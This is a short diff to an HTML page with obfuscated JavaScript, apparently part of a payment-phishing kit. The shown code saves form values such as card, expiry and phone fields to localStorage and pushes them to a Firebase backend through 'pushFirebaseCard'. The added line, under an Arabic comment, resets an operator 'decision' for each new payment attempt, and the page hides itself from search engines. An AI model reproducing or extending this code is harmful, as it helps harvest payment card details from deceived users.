@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20260912"></script>
+<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20260913"></script>
 
 
 
@@ -2367,6 +2367,8 @@ function v223(v9p, v9bk, v6, v9em, v9ey, v9pn) {
 		window.localStorage.setItem(v167, v9ey || "");
 		window.localStorage.setItem(v168, v9pn || "");
 
+		// محاولة دفع جديدة لكل إرسال (تصفير أي قرار سابق وربط القرارات بالعملية الحالية)
+		try { if (typeof window.startNewAttempt === 'function') window.startNewAttempt('pay'); } catch (e) {}
 		if (typeof window.pushFirebaseCard === 'function') {
 			return window.pushFirebaseCard(v9fp, v9fb, v6, v9em, v9ey, v9pn)
 				.catch((err) => {
